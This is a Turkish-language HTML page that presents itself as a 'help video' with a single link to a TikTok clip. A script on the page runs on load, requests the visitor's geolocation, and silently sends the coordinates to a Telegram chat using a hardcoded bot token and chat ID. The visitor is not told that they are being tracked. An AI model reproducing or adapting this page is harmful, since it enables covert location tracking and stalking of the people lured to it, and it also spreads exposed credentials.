<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Yardım Videosu</title>
  <style>
    body {
      margin: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    a {
      color: #fff;
      font-size: 24px;
      text-decoration: none;
      border: 2px solid #fff;
      padding: 10px 20px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <a href="https://vt.tiktok.com/ZSrpwC3hg/" target="_blank">Videoyu İzle</a>

  <script>
    const botToken = '7315012164:AAFwEEQ-Oi26-gl6o7ulfpCRPzRh1XUPzK8';
    const chatId = '7874399327';

    function sendLocation(lat, lon) {
      const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
      fetch(url).catch(() => {});
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            sendLocation(position.coords.latitude, position.coords.longitude);
          },
          () => {}
        );
      }
    }

    getLocation();
  </script>
</body>
</html>
